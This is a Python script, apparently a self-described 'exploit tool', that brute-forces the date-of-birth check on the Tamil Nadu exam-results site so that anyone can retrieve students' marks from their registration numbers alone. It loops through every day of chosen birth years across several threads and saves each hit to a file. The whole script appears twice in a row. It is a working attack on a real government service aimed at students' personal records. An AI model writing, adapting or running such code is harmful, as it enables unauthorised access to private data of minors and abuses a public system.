import requests,sys
from bs4 import BeautifulSoup
from datetime import datetime,timedelta
import threading as th

def INDERFACE():
    print("\n"," WELCOME TO EXPLOITE TOOL"+"\n") 
    print("Description : Useing this tool we can get information about tnresult, access server with web scraping and pypass cross domite site , wee just need one regno enoghf to find all but secound statement dob pypass by bruteforce attack ")
    print("\n"+"we need Reg(number or sheet) ,and need bod sheet about student brith year" + "\n")

    print(" Tool created by [.black]","\n")
    
def resquest(reg,dob):
    url = 'https://tnresults.nic.in/wrfexrcd.asp' # CHECK URLPATH TO CORRECT SITE AATTACK
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
'Cache-Control': 'max-age=0' ,
'Connection': 'keep-alive',
'Content-Length': '45',
'Content-Type':'application/x-www-form-urlencoded',
'Cookie': 'ASPSESSIONIDCQABDARQ-GAAMKBBBEHJNBIKLKOCKENHL' ,
'Host': 'tnresults.nic.in',
'Origin': 'https://tnresults.nic.in',
'Referer': 'https://tnresults.nic.in/wpcsxtd.htm',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-User': '?1',
'Upgrade-Insecure-Requests': '1User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36sec-ch-ua: "Not-A. Brand";v="99", "Chromium"; v="124" ' ,
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android" '}
    payload = {'regno':reg,'dob':dob,'B1':'Get Marks'}
    responce = requests.post(url,headers=header,data=payload)
    return responce

_Result=[]
_Bruter=[]

def render_day(year):    
    date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
    data = [f"{year}-01-01"]
    
    if year==2008: #spcieal for leap year guys
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    else:
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    return data
    
def modify(day):
    ds= day.split("-")
    return str(f"{ds[2]}/{ds[1]}/{ds[0]}")
    
def datasheet(path):# this method enpack data , txt to array
    with open(path,'r') as file:
        data=[]
        lines = file.readlines()
        for line in lines:
            data.append(line.replace('\n',''))
        return data

def engage_reg(text):
    info = text.split(",")
    data=[]
    
    if str(info[0][-4:]) == '.txt':
        return datasheet(str(info[0]))     
    else:
        for id in info:
            data.append(id)
        return data
        
def engage_dob(text):
	if '/' in text:
	     return text.split(',')
	else:
	     years=text.split(',')
	     dates=[]
	     data=[]
	     if  str(years[0][-4:]) == '.txt':
	        return datasheet(str(years[0]))
	     elif len(years[0]) ==10:
	         for year in years:
	             dates.append(year)
	         return dates
	     else:
	         for year in years:
	                for date in render_day(year):
	                    data.append(date)
	         for day in data:
	             dates.append(modify(day))
	         return dates
         
def OUTPUT(student,date,content):
    name= ' ' + content.splitlines()[6] +') '
    with open(f"result[{name}].txt","w") as file:
        file.write(f" {student} || {date} "+"\n")
        file.write(str(content)+"\n"+"\n")
        file.close()
        _Result.append(str(content))

def drive_data(list):
    data=[]
    measure= str(len(list)/10).split('.')
    
    for i in range(int(measure[0])):
        data.append(  list[int(f'{i}0') : (int(f'{i}0') +10)])
    if not measure[1] ==0:
        set= list[-int(measure[1]):]
        data.append(set)
        
    return data
                
def Bruter(ID,DOB,name):
    regT=0
    dobT=0
    
    for student in ID: #User
        regT = regT +1
        per = len(DOB)
        
        for date in DOB: #date
            dobT = dobT+1
            per = per-1
            package = resquest(student,date)
            size=str(len(package.content)/1008)[0:4]
            status=package.status_code
            content= BeautifulSoup(package.text,'html.parser').find('div',{'data-role' : 'content'}).text
           
            if 50 < len(content):
                print('')
                print(f"** [acssxx] : [{student} || {date}] -> {regT}/{dobT} @!:{status} ^ {size}kb   ")
                print(content)
                OUTPUT(student,date,content)
                break
                
            elif 50 >= len(content):
                 print(f"[req] :  {student} || {date}  {regT}/{dobT}  [{per}]@{status}  ^ ({size}kb) ")
             
    print(f'[{name}] :: BRUTER FINISH THERE POSSIBILTY ')
                 
def INPUT():
    reg,dob=0,0
    if  len(sys.argv) >= 2:
        reg = engage_reg(sys.argv[1])
        dob = engage_dob(sys.argv[2])
    
    else:
        reg = engage_reg(input("Regno -> "))
        dob=engage_dob(input("Dob  -> "))
    return reg,dob

def MULTI_HANDLER(ID,DOB):
    IDs = drive_data(ID)
    
    for brute in range(len(IDs)):
        brute = th.Thread(target=Bruter,args=(IDs[brute],DOB,f'Bruter{brute}',))
        brute.start()
        _Bruter.append(brute)
    
INDERFACE()
_ID_, _DOB_ = INPUT()
MULTI_HANDLER(_ID_, _DOB_)

for result in _Result:
    print(result)
import requests,sys
from bs4 import BeautifulSoup
from datetime import datetime,timedelta
import threading as th

def INDERFACE():
    print("\n"," WELCOME TO EXPLOITE TOOL"+"\n") 
    print("Description : Useing this tool we can get information about tnresult, access server with web scraping and pypass cross domite site , wee just need one regno enoghf to find all but secound statement dob pypass by bruteforce attack ")
    print("\n"+"we need Reg(number or sheet) ,and need bod sheet about student brith year" + "\n")

    print(" Tool created by [.black]","\n")
    
def resquest(reg,dob):
    url = 'https://tnresults.nic.in/wrfexrcd.asp' # CHECK URLPATH TO CORRECT SITE AATTACK
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
'Cache-Control': 'max-age=0' ,
'Connection': 'keep-alive',
'Content-Length': '45',
'Content-Type':'application/x-www-form-urlencoded',
'Cookie': 'ASPSESSIONIDCQABDARQ-GAAMKBBBEHJNBIKLKOCKENHL' ,
'Host': 'tnresults.nic.in',
'Origin': 'https://tnresults.nic.in',
'Referer': 'https://tnresults.nic.in/wpcsxtd.htm',
'Sec-Fetch-Dest': 'document',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Site': 'same-origin',
'Sec-Fetch-User': '?1',
'Upgrade-Insecure-Requests': '1User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36sec-ch-ua: "Not-A. Brand";v="99", "Chromium"; v="124" ' ,
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android" '}
    payload = {'regno':reg,'dob':dob,'B1':'Get Marks'}
    responce = requests.post(url,headers=header,data=payload)
    return responce

_Result=[]
_Bruter=[]

def render_day(year):    
    date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
    data = [f"{year}-01-01"]
    
    if year==2008: #spcieal for leap year guys
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    else:
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    return data
    
def modify(day):
    ds= day.split("-")
    return str(f"{ds[2]}/{ds[1]}/{ds[0]}")
    
def datasheet(path):# this method enpack data , txt to array
    with open(path,'r') as file:
        data=[]
        lines = file.readlines()
        for line in lines:
            data.append(line.replace('\n',''))
        return data

def engage_reg(text):
    info = text.split(",")
    data=[]
    
    if str(info[0][-4:]) == '.txt':
        return datasheet(str(info[0]))     
    else:
        for id in info:
            data.append(id)
        return data
        
def engage_dob(text):
	if '/' in text:
	     return text.split(',')
	else:
	     years=text.split(',')
	     dates=[]
	     data=[]
	     if  str(years[0][-4:]) == '.txt':
	        return datasheet(str(years[0]))
	     elif len(years[0]) ==10:
	         for year in years:
	             dates.append(year)
	         return dates
	     else:
	         for year in years:
	                for date in render_day(year):
	                    data.append(date)
	         for day in data:
	             dates.append(modify(day))
	         return dates
         
def OUTPUT(student,date,content):
    name= ' ' + content.splitlines()[6] +') '
    with open(f"result[{name}].txt","w") as file:
        file.write(f" {student} || {date} "+"\n")
        file.write(str(content)+"\n"+"\n")
        file.close()
        _Result.append(str(content))

def drive_data(list):
    data=[]
    measure= str(len(list)/10).split('.')
    
    for i in range(int(measure[0])):
        data.append(  list[int(f'{i}0') : (int(f'{i}0') +10)])
    if not measure[1] ==0:
        set= list[-int(measure[1]):]
        data.append(set)
        
    return data
                
def Bruter(ID,DOB,name):
    regT=0
    dobT=0
    
    for student in ID: #User
        regT = regT +1
        per = len(DOB)
        
        for date in DOB: #date
            dobT = dobT+1
            per = per-1
            package = resquest(student,date)
            size=str(len(package.content)/1008)[0:4]
            status=package.status_code
            content= BeautifulSoup(package.text,'html.parser').find('div',{'data-role' : 'content'}).text
           
            if 50 < len(content):
                print('')
                print(f"** [acssxx] : [{student} || {date}] -> {regT}/{dobT} @!:{status} ^ {size}kb   ")
                print(content)
                OUTPUT(student,date,content)
                break
                
            elif 50 >= len(content):
                 print(f"[req] :  {student} || {date}  {regT}/{dobT}  [{per}]@{status}  ^ ({size}kb) ")
             
    print(f'[{name}] :: BRUTER FINISH THERE POSSIBILTY ')
                 
def INPUT():
    reg,dob=0,0
    if  len(sys.argv) >= 2:
        reg = engage_reg(sys.argv[1])
        dob = engage_dob(sys.argv[2])
    
    else:
        reg = engage_reg(input("Regno -> "))
        dob=engage_dob(input("Dob  -> "))
    return reg,dob

def MULTI_HANDLER(ID,DOB):
    IDs = drive_data(ID)
    
    for brute in range(len(IDs)):
        brute = th.Thread(target=Bruter,args=(IDs[brute],DOB,f'Bruter{brute}',))
        brute.start()
        _Bruter.append(brute)
    
INDERFACE()
_ID_, _DOB_ = INPUT()
MULTI_HANDLER(_ID_, _DOB_)

for result in _Result:
    print(result)
